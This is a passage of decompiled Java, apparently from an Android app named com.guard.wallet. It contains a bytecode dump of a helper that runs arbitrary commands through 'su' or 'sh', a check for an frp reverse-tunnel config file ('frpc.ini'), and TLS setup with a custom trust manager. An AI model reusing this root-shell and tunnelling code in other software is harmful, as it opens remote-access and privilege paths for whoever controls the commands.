      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.RuntimeException: parsing failure!
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:211)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 000: aload 0
      // 001: arraylength
      // 002: istore 4
      // 004: aconst_null
      // 005: astore 11
      // 007: aconst_null
      // 008: astore 9
      // 00a: aconst_null
      // 00b: astore 10
      // 00d: bipush -1
      // 00e: istore 3
      // 00f: iload 4
      // 011: ifne 01f
      // 014: new com/guard/wallet/entity/CommandResult
      // 017: dup
      // 018: bipush -1
      // 019: aconst_null
      // 01a: aconst_null
      // 01b: invokespecial com/guard/wallet/entity/CommandResult.<init> (ILjava/util/List;Ljava/util/List;)V
      // 01e: areturn
      // 01f: new java/util/LinkedList
      // 022: dup
      // 023: invokespecial java/util/LinkedList.<init> ()V
      // 026: astore 13
      // 028: new java/util/LinkedList
      // 02b: dup
      // 02c: invokespecial java/util/LinkedList.<init> ()V
      // 02f: astore 12
      // 031: invokestatic java/lang/Runtime.getRuntime ()Ljava/lang/Runtime;
      // 034: astore 8
      // 036: iload 1
      // 037: ifeq 042
      // 03a: ldc_w "su"
      // 03d: astore 7
      // 03f: goto 047
      // 042: ldc_w "sh"
      // 045: astore 7
      // 047: aload 8
      // 049: aload 7
      // 04b: invokevirtual java/lang/Runtime.exec (Ljava/lang/String;)Ljava/lang/Process;
      // 04e: astore 7
      // 050: new java/io/DataOutputStream
      // 053: astore 8
      // 055: aload 8
      // 057: aload 7
      // 059: invokevirtual java/lang/Process.getOutputStream ()Ljava/io/OutputStream;
      // 05c: invokespecial java/io/DataOutputStream.<init> (Ljava/io/OutputStream;)V
      // 05f: iload 3
      // 060: istore 4
      // 062: aload 0
      // 063: arraylength
      // 064: istore 6
      // 066: bipush 0
      // 067: istore 5
      // 069: iload 5
      // 06b: iload 6
      // 06d: if_icmpge 0a4
      // 070: aload 0
      // 071: iload 5
      // 073: aaload
      // 074: astore 9
      // 076: aload 9
      // 078: ifnonnull 07e
      // 07b: goto 09e
      // 07e: iload 3
      // 07f: istore 4
      // 081: aload 8
      // 083: aload 9
      // 085: invokevirtual java/lang/String.getBytes ()[B
      // 088: invokevirtual java/io/OutputStream.write ([B)V
      // 08b: iload 3
      // 08c: istore 4
      // 08e: aload 8
      // 090: ldc_w "\n"
      // 093: invokevirtual java/io/DataOutputStream.writeBytes (Ljava/lang/String;)V
      // 096: iload 3
      // 097: istore 4
      // 099: aload 8
      // 09b: invokevirtual java/io/DataOutputStream.flush ()V
      // 09e: iinc 5 1
      // 0a1: goto 069
      // 0a4: iload 3
      // 0a5: istore 4
      // 0a7: aload 8
      // 0a9: ldc_w "exit\n"
      // 0ac: invokevirtual java/io/DataOutputStream.writeBytes (Ljava/lang/String;)V
      // 0af: iload 3
      // 0b0: istore 4
      // 0b2: aload 8
      // 0b4: invokevirtual java/io/DataOutputStream.flush ()V
      // 0b7: iload 3
      // 0b8: istore 4
      // 0ba: aload 7
      // 0bc: invokevirtual java/lang/Process.waitFor ()I
      // 0bf: istore 3
      // 0c0: iload 2
      // 0c1: ifeq 14c
      // 0c4: iload 3
      // 0c5: istore 4
      // 0c7: new java/io/InputStreamReader
      // 0ca: astore 0
      // 0cb: iload 3
      // 0cc: istore 4
      // 0ce: aload 0
      // 0cf: aload 7
      // 0d1: invokevirtual java/lang/Process.getInputStream ()Ljava/io/InputStream;
      // 0d4: invokespecial java/io/InputStreamReader.<init> (Ljava/io/InputStream;)V
      // 0d7: iload 3
      // 0d8: istore 4
      // 0da: new java/io/BufferedReader
      // 0dd: dup
      // 0de: aload 0
      // 0df: invokespecial java/io/BufferedReader.<init> (Ljava/io/Reader;)V
      // 0e2: astore 9
      // 0e4: new java/io/BufferedReader
      // 0e7: astore 0
      // 0e8: new java/io/InputStreamReader
      // 0eb: astore 10
      // 0ed: aload 10
      // 0ef: aload 7
      // 0f1: invokevirtual java/lang/Process.getErrorStream ()Ljava/io/InputStream;
      // 0f4: invokespecial java/io/InputStreamReader.<init> (Ljava/io/InputStream;)V
      // 0f7: aload 0
      // 0f8: aload 10
      // 0fa: invokespecial java/io/BufferedReader.<init> (Ljava/io/Reader;)V
      // 0fd: aload 9
      // 0ff: invokevirtual java/io/BufferedReader.readLine ()Ljava/lang/String;
      // 102: astore 10
      // 104: aload 10
      // 106: ifnull 114
      // 109: aload 13
      // 10b: aload 10
      // 10d: invokevirtual java/util/LinkedList.add (Ljava/lang/Object;)Z
      // 110: pop
      // 111: goto 0fd
      // 114: aload 0
      // 115: invokevirtual java/io/BufferedReader.readLine ()Ljava/lang/String;
      // 118: astore 10
      // 11a: aload 10
      // 11c: ifnull 12a
      // 11f: aload 12
      // 121: aload 10
      // 123: invokevirtual java/util/LinkedList.add (Ljava/lang/Object;)Z
      // 126: pop
      // 127: goto 114
      // 12a: goto 152
      // 12d: astore 10
      // 12f: goto 13b
      // 132: astore 10
      // 134: goto 1ec
      // 137: astore 10
      // 139: aconst_null
      // 13a: astore 0
      // 13b: aload 9
      // 13d: astore 11
      // 13f: aload 0
      // 140: astore 9
      // 142: goto 196
      // 145: astore 10
      // 147: aconst_null
      // 148: astore 0
      // 149: goto 1ec
      // 14c: aconst_null
      // 14d: astore 0
      // 14e: aload 10
      // 150: astore 9
      // 152: aload 8
      // 154: invokevirtual java/io/OutputStream.close ()V
      // 157: aload 9
      // 159: ifnull 161
      // 15c: aload 9
      // 15e: invokevirtual java/io/BufferedReader.close ()V
      // 161: iload 3
      // 162: istore 4
      // 164: aload 7
      // 166: astore 8
      // 168: aload 0
      // 169: ifnull 189
      // 16c: aload 0
      // 16d: invokevirtual java/io/BufferedReader.close ()V
      // 170: iload 3
      // 171: istore 4
      // 173: aload 7
      // 175: astore 8
      // 177: goto 189
      // 17a: astore 0
      // 17b: ldc_w "ShellUtils"
      // 17e: aload 0
      // 17f: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 182: aload 7
      // 184: astore 8
      // 186: iload 3
      // 187: istore 4
      // 189: aload 8
      // 18b: invokevirtual java/lang/Process.destroy ()V
      // 18e: goto 233
      // 191: astore 10
      // 193: aconst_null
      // 194: astore 9
      // 196: aload 10
      // 198: astore 0
      // 199: aload 11
      // 19b: astore 10
      // 19d: aload 9
      // 19f: astore 11
      // 1a1: goto 24d
      // 1a4: astore 0
      // 1a5: iload 4
      // 1a7: istore 3
      // 1a8: goto 1bd
      // 1ab: astore 0
      // 1ac: aconst_null
      // 1ad: astore 10
      // 1af: aconst_null
      // 1b0: astore 11
      // 1b2: aload 9
      // 1b4: astore 8
      // 1b6: goto 24d
      // 1b9: astore 0
      // 1ba: aconst_null
      // 1bb: astore 8
      // 1bd: aconst_null
      // 1be: astore 11
      // 1c0: aconst_null
      // 1c1: astore 9
      // 1c3: aload 0
      // 1c4: astore 10
      // 1c6: aload 11
      // 1c8: astore 0
      // 1c9: goto 1ec
      // 1cc: astore 0
      // 1cd: aconst_null
      // 1ce: astore 10
      // 1d0: aconst_null
      // 1d1: astore 7
      // 1d3: aload 7
      // 1d5: astore 11
      // 1d7: aload 9
      // 1d9: astore 8
      // 1db: goto 24d
      // 1de: astore 10
      // 1e0: aconst_null
      // 1e1: astore 7
      // 1e3: aconst_null
      // 1e4: astore 0
      // 1e5: aload 0
      // 1e6: astore 8
      // 1e8: aload 8
      // 1ea: astore 9
      // 1ec: ldc_w "ShellUtils"
      // 1ef: aload 10
      // 1f1: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 1f4: aload 8
      // 1f6: ifnull 205
      // 1f9: aload 8
      // 1fb: invokevirtual java/io/OutputStream.close ()V
      // 1fe: goto 205
      // 201: astore 0
      // 202: goto 21a
      // 205: aload 9
      // 207: ifnull 20f
      // 20a: aload 9
      // 20c: invokevirtual java/io/BufferedReader.close ()V
      // 20f: aload 0
      // 210: ifnull 221
      // 213: aload 0
      // 214: invokevirtual java/io/BufferedReader.close ()V
      // 217: goto 221
      // 21a: ldc_w "ShellUtils"
      // 21d: aload 0
      // 21e: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 221: iload 3
      // 222: istore 4
      // 224: aload 7
      // 226: ifnull 233
      // 229: iload 3
      // 22a: istore 4
      // 22c: aload 7
      // 22e: astore 8
      // 230: goto 189
      // 233: new com/guard/wallet/entity/CommandResult
      // 236: dup
      // 237: iload 4
      // 239: aload 13
      // 23b: aload 12
      // 23d: invokespecial com/guard/wallet/entity/CommandResult.<init> (ILjava/util/List;Ljava/util/List;)V
      // 240: areturn
      // 241: astore 12
      // 243: aload 0
      // 244: astore 11
      // 246: aload 9
      // 248: astore 10
      // 24a: aload 12
      // 24c: astore 0
      // 24d: aload 8
      // 24f: ifnull 25f
      // 252: aload 8
      // 254: invokevirtual java/io/OutputStream.close ()V
      // 257: goto 25f
      // 25a: astore 8
      // 25c: goto 276
      // 25f: aload 10
      // 261: ifnull 269
      // 264: aload 10
      // 266: invokevirtual java/io/BufferedReader.close ()V
      // 269: aload 11
      // 26b: ifnull 27e
      // 26e: aload 11
      // 270: invokevirtual java/io/BufferedReader.close ()V
      // 273: goto 27e
      // 276: ldc_w "ShellUtils"
      // 279: aload 8
      // 27b: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 27e: aload 7
      // 280: ifnull 288
      // 283: aload 7
      // 285: invokevirtual java/lang/Process.destroy ()V
      // 288: aload 0
      // 289: athrow
   }

   public static boolean v(String var0) {
      StringBuilder var1 = new StringBuilder();
      var1.append(var0);
      var1.append("/frpc.ini");
      return w(var1.toString());
   }

   public static boolean w(String var0) {
      File var1 = new File(var0);
      if (var1.exists() && var1.isFile()) {
         StringBuilder var2 = new StringBuilder();
         var2.append(var0);
         var2.append(" 文件存在");
         Log.d("FileUtils", var2.toString());
         return true;
      } else {
         return false;
      }
   }

   public static String x(String var0) {
      if (!B(var0)) {
         int var1 = var0.lastIndexOf("/");
         if (var1 != -1) {
            return var0.substring(var1 + 1);
         }
      }

      return null;
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static SSLContext y(b1.k var0) {
      SSLContext var2 = j;
      if (var2 != null) {
         return var2;
      } else {
         boolean var7 = false /* VF: Semaphore variable */;

         label46: {
            try {
               var7 = true;
               int var1 = OpenSSLProvider.a;
               j = SSLContext.getInstance("TLSv1.3", OpenSSLProvider.class.newInstance());
               i = true;
               var7 = false;
               break label46;
            } catch (NoSuchAlgorithmException var8) {
               var0 = var8;
               var7 = false;
            } finally {
               if (var7) {
                  if (VERSION.SDK_INT >= 29) {
                     j = SSLContext.getInstance("TLSv1.3");
                     i = false;
                     break label46;
                  }

                  throw new NoSuchAlgorithmException("TLSv1.3 isn't supported on your platform. Use custom Conscrypt library instead.");
               }
            }

            throw var0;
         }

         PrintStream var3 = System.out;
         StringBuilder var4 = new StringBuilder("Using ");
         String var11;
         if (i) {
            var11 = "custom";
         } else {
            var11 = "default";
         }

         var4.append(var11);
         var4.append(" TLSv1.3 provider...");
         var3.println(var4.toString());
         var2 = j;
         b1.q var14 = new b1.q((b1.k)var0);
         b1.r var13 = new b1.r();
         SecureRandom var10 = new SecureRandom();
         var2.init(new KeyManager[]{var14}, new X509TrustManager[]{var13}, var10);
         return j;
      }
   }

   public static boolean z() {
      com.guard.wallet.bridge.a var1 = e;
      boolean var0;
      if (var1 != null && var1.w.get()) {
         var0 = true;
      } else {
         var0 = false;
      }

      return var0;
   }

   public abstract void V(f var1);

   public abstract List f(String var1, List var2);

   public abstract long i();

   public abstract x j();
}
